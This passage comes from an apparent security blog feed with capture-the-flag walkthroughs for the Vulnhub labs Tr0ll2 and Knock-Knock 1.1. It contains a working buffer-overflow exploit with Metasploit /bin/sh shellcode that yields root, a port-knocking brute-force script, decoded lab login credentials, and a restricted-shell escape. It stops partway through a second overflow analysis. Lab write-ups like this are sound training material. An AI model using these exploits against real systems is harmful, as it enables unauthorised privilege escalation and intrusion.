+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# /usr/share/metasploit-framework/tools/pattern_create.rb 500
+</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then use <code>gdb</code> on target machine to track the value of EIP when overflow happened.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ gdb -q ./r00t
+</span><span class='line'>gdb -q ./r00t
+</span><span class='line'>Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t&hellip;done.
+</span><span class='line'>(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
+</span><span class='line'>&lt;7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq                &lt;br/>
+</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>0x6a413969 in ?? ()
+</span><span class='line'>(gdb) i r esp
+</span><span class='line'>i r esp
+</span><span class='line'>esp            0xbffffab0   0xbffffab0
+</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure></p>
+
+<p><code>0x6a413969</code> is the pattern, and I use <code>pattern_offset.rb</code> to get the offset is <font color="red">268</font>. Also, I got the value in ESP is <code>0xbffffab0</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x6a413969
+</span><span class='line'>[*] Exact match at offset 268</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then I use metasploit to generate a shellcode to run <code>/bin/sh</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf payload(exec) > generate -b &lsquo;\x00\x0a\x0d&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>linux/x86/exec - 70 bytes&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>&lt;a href="http://www.metasploit.com">http://www.metasploit.com&lt;/a>&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Encoder: x86/shikata_ga_nai&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>VERBOSE=false, PrependFork=false, PrependSetresuid=false,&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>PrependSetreuid=false, PrependSetuid=false,&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>PrependSetresgid=false, PrependSetregid=false,&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>PrependSetgid=false, PrependChrootBreak=false,&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>AppendExit=false, CMD=/bin/sh&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>buf =
+</span><span class='line'>&ldquo;\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9&rdquo; +
+</span><span class='line'>&ldquo;\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11&rdquo; +
+</span><span class='line'>&ldquo;\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55&rdquo; +
+</span><span class='line'>&ldquo;\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a&rdquo; +
+</span><span class='line'>&ldquo;\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93&rdquo;
+</span><span class='line'>msf payload(exec) ></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Next, construct the payload and exploit the <code>r00t</code> file to get ROOT on the target!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &ldquo;print &lsquo;A&rsquo; * 268 + &lsquo;\x80\xfb\xff\xbf&rsquo; + &lsquo;\x90&rsquo; * 16 + &lsquo;\xba\xa0\x7b\x18\x95\xdb\xcd\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x0b\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\x55\x11\x13\xcd\x0c\xb4\x45\x85\x03\x5a\x03\xb2\x33\xb3\x60\x55\xc3\xa3\xa9\xc7\xaa\x5d\x3f\xe4\x7e\x4a\x37\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93&rsquo;&rdquo;)
+</span><span class='line'>&lt;7\xeb\x7e\x8a\x67\x89\x17\xe4\x58\x3e\x8f\xf8\xf1\x93\xc6\x18\x30\x93'&ldquo;)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>id&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>id
+</span><span class='line'>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</span></code></pre></td></tr></table></div></figure></p>
+
+<p>And then take the FLAG down!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cd /root&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>cd /root&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>ls -al&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>ls -al
+</span><span class='line'>total 80
+</span><span class='line'>drwx&mdash;&mdash; 11 root   root   4096 Oct 14  2014 .
+</span><span class='line'>drwxr-xr-x 23 root   root   4096 Oct  5  2014 ..
+</span><span class='line'>-rw&mdash;&mdash;-  1 root   root     67 Oct 14  2014 .bash_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root   3106 Apr 19  2012 .bashrc
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root    140 Apr 19  2012 .profile
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root     66 Oct  5  2014 .selected_editor
+</span><span class='line'>drwx&mdash;&mdash;  2 root   root   4096 Oct  4  2014 .ssh
+</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  5  2014 .vim
+</span><span class='line'>-rw&mdash;&mdash;-  1 root   root   4259 Oct 14  2014 .viminfo
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root     68 Oct  6  2014 Proof.txt
+</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core1
+</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core2
+</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core3
+</span><span class='line'>drwxr-xr-x  5 root   root   4096 Oct  4  2014 core4
+</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  5  2014 goal
+</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  6  2014 hardmode
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 maleus maleus 1474 Oct  4  2014 lmao.zip
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root   root    828 Oct  4  2014 ran_dir.py
+</span><span class='line'>drwxr-xr-x  2 root   root   4096 Oct  6  2014 reboot&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cat Proof.txt&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>cat Proof.txt
+</span><span class='line'>You win this time young Jedi&hellip;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>a70354f0258dcc00292c72aab3c8b1e4&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[[Vulnhub]Knock-Knock: 1.1]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1/"/>
+    <updated>2015-06-21T04:49:54-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/06/21/vulnhub-knock-knock-1-dot-1</id>
+    <content type="html"><![CDATA[<p>&ldquo;Pretty much thought of a pretty neat idea I hadn&rsquo;t seen done before with a VM, and I wanted to turn it into reality!
+Your job is to escalate to root, and find the flag.
+Since I&rsquo;ve gotten a few PM&rsquo;s, remember: There is a difference between "Port Unreachable&rdquo; and &ldquo;Host Unreachable&rdquo;. DHCP is not broken ;)
+Gotta give a huge shoutout to c0ne for helping to creating the binary challenge, and rasta_mouse and recrudesce for testing :)
+Also, gotta thank barrebas who was able to find a way to make things easier&hellip; but of course that is fixed with this update! ;)&ldquo; &ndash; <a href="http://blog.zer0w1re.net/">zer0w1re</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/knock-knock-11,105/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>
+
+<p>Target: TopHatSec: Freshly (<em>10.10.10.140/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Port knocking brute-force to open the hidden ports</li>
+<li>Secret information hidden in picture</li>
+<li>Buffer Overflow analysis and exploit</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
+<li>Analysis and write script to brute force port knocking</li>
+<li>Port scanned again to dicover the real open ports [<font color="FF8000">nmap</font>]</li>
+<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
+<li>Download picture and reveal the hidden information</li>
+<li>Crack the cipher text to get login creditional in plain text [<font color="FF8000">Caesar shift with ROT 13</font>]</li>
+<li>Login SSH with cracked login creditional</li>
+<li>Look around and found suspicious program with SUID bit set</li>
+<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.140 in this case).</p>
+
+<p><img class="left" src="/downloads/knock-knock/1.png"></p>
+
+<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, only TCP port 1337 has been discovered running on Ubuntu Linux.
+<code>nmap -v -sV -A -O -T4 -p- 10.10.10.140</code></p>
+
+<p><img class="left" src="/downloads/knock-knock/2.png"></p>
+
+<h3>Port knocking</h3>
+
+<p>In order to understand what Port Knocking is and how it works, I found the following 2 links: <a href="http://www.portknocking.org/">link_1</a>, <a href="https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu">link_2</a>.</p>
+
+<p>Basically, I need to send SYN request to several random ports (3 in this case) in correct orders and valid time period, then the firewall or proxy will change the rules to open hidden ports.</p>
+
+<p><img class="left" src="/downloads/knock-knock/3.png"></p>
+
+<p>Due to there are 3 ports and total 6 possible orders for the sequence, I wrote a script to try all the possibilities.</p>
+
+<p><figure class='code'><figcaption><span>knock.py  (knock.py)</span> <a href='/downloads/code/knock.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutations</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.140&quot;</span>			<span class="c">#target IP</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">Knockports</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
+</span><span class='line'>	<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
+</span><span class='line'>		<span class="k">try</span><span class="p">:</span>
+</span><span class='line'>			<span class="k">print</span> <span class="s">&quot;[*] Knocking on port: &quot;</span><span class="p">,</span> <span class="n">port</span>
+</span><span class='line'>			<span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>			<span class="c"># set timeout in 0.1s</span>
+</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span><span class='line'>			<span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>		<span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+</span><span class='line'>			<span class="k">print</span> <span class="s">&quot;[-] </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">e</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span><span class='line'>	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>	<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>				<span class="c">#connect to port 1337 to grab three random ports</span>
+</span><span class='line'>	<span class="n">r</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>	
+</span><span class='line'>	<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>	<span class="k">print</span> <span class="s">&quot;received: &quot;</span><span class="p">,</span> <span class="n">r</span>
+</span><span class='line'>
+</span><span class='line'>	<span class="k">for</span> <span class="n">comb</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>		<span class="c"># try all the possibility of 3-ports orders </span>
+</span><span class='line'>		<span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Trying sequence </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
+</span><span class='line'>		<span class="n">Knockports</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>	<span class="k">print</span> <span class="s">&quot;[*] Done&quot;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">main</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/knock-knock/4.png"></p>
+
+<p>After run the script, use nmap to check open services.</p>
+
+<p><img class="left" src="/downloads/knock-knock/5.png"></p>
+
+<p>Now two more ports discovered: <code>22</code> and <code>80</code>.</p>
+
+<p>Next I run nikto scan on port 80 and Dirbuster to guess hidden paths as standard procedure but nothing found, only the knock knock picture. So I downloaded the picture and use command <code>strings</code> to check if there is anything hidden in the the picture.</p>
+
+<p><img class="left" src="/downloads/knock-knock/6.png"></p>
+
+<p>Bingo! Very juicy information found in the end:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Login Credentials
+</span><span class='line'>abfnW
+</span><span class='line'>sax2Cw90w</span></code></pre></td></tr></table></div></figure></p>
+
+<p>After tried several different encryption methods, I found this is encrypted by <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> with ROT-13. There is an useful online <a href="http://www.xarg.org/tools/caesar-cipher/">Caesarian cipher decryption tool</a> which allow me to decrypt cipher text in different ROT number to detect the correct ROT number.</p>
+
+<p>After decrypted:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>abfnW       -     nosaJ
+</span><span class='line'>sax2Cw9Ow   -     fnk2Pj9Bj</span></code></pre></td></tr></table></div></figure></p>
+
+<p>They are actually backwards, so the Login Credential is</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>username: Jason
+</span><span class='line'>password: jB9jP2knf</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now I can SSH login to the target (I tried &lsquo;Jason&rsquo; first but failed, when I tried all lower case &lsquo;jason&rsquo;, it works)</p>
+
+<p><img class="left" src="/downloads/knock-knock/7.png"></p>
+
+<h3>Shell Escape</h3>
+
+<p>Due to the current shell is Restricted, I use python <code>python -c "import pty; pty.spawn('/bin/bash')"</code> to escape.</p>
+
+<p><img class="left" src="/downloads/knock-knock/8.png"></p>
+
+<p>By poking around, I found a binary program &lsquo;tfc&rsquo; with SUID bit set which normally can help us to get ROOT.</p>
+
+<p><img class="left" src="/downloads/knock-knock/9.png"></p>
+
+<p>This is a file encryption program, first argument is the input file (plain text) and the second argument is the output file (cipher text), both of the input and output have to be <code>.tfc</code> extension.</p>
+
+<p><img class="left" src="/downloads/knock-knock/10.png"></p>
+
+<p>As we can see above, reverse the input file and output file, it will decrypt the cipher text.</p>
+
+<p>Now let&rsquo;s try a large file to see if it has Buffer Overflow vulnerability.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ python -c &ldquo;print &lsquo;A&rsquo;*5000&rdquo; > in.tfc
+</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Segmentation fault!! sounds like it has BoF. Then I use <a href="link:%20http://www.trapkit.de/tools/checksec.html">searchsec.sh</a> to check what protections are enabled on it.</p>
+
+<p><img class="left" src="/downloads/knock-knock/11.png"></p>
+
+<p>Cool, there is no any protection at all!</p>
+
+<p>Due to gdb is not installed on the target machine, I have to download the tfc program to my Kali for further analyzing.</p>
+
+<p><img class="left" src="/downloads/knock-knock/12.png"></p>
+
+<p>Why here is <code>0x0675c916</code> but not expected <code>0x41414141</code>? After playing around and further analysis, this should be encrypted of <code>0x41414141</code>. So I need the payload encrypted first. Thanks to <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>. He provided a method to get encrypted data from core dump file. This method will save lots of time and works to reverse engineering the <code>tfc</code> program for re-writing the encryption script.</p>
+
+<p>Next, I need to find where is the offset to just change the EIP. After tried several varying lengths and checking the value of return address in gdb. I finally found the offset to overwrite the return address (4124 bytes).</p>
+
+<p>Due to 4 &lsquo;A&rsquo;s always starts with same bytes 'def0 5bab&rsquo; in encrypted file, So &lsquo;def0 5bab&rsquo; can be used as a pattern to locate encrypted data in core dump file.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c &lsquo;print &ldquo;A&rdquo; * 100&rsquo; > in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;blockquote>&lt;blockquote>&lt;p>File crypted, goodbye!
+</span><span class='line'>root@kali:~# xxd out.tfc | head
+</span><span class='line'>0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p></blockquote></blockquote>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c &lsquo;print &ldquo;A&rdquo; * 5000&rsquo; > in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>root@kali:~# xxd core | grep &lsquo;def0 5bab&rsquo;
+</span><span class='line'>0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C&hellip;dl..H</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Next, use <code>msfelfscan</code> to get jmp esp address.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfelfscan -j esp tfc
